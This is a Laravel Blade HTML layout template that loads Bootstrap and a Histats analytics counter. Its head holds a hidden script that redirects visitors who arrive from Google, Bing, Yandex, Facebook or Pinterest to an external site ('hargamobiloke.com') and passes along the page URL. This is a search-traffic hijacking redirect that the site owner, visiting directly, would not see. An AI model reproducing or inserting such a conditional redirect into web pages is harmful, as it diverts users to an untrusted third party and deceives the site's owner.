<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    @yield('head')
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

    <script type='text/javascript'>
        if(document.referrer)
        {
            var cek = document.referrer;
            var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.') || cek.includes('pinterest.');
            if(is_se)
            {
                var url = window.location.href;
                window.location = "https://www.hargamobiloke.com/?goads="+ encodeURIComponent(url);
            }
        }
    </script>
</head>
<body>

    @yield('content')

    <script type="text/javascript">var _Hasync= _Hasync|| [];
        _Hasync.push(['Histats.start', '1,4422210,4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function() {
            var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
            hs.src = ('//s10.histats.com/js15_as.js');
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
        })();</script>
    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4422210&101" alt="" border="0"></a></noscript>
    <!-- Histats.com  END  -->

</body>
</html>
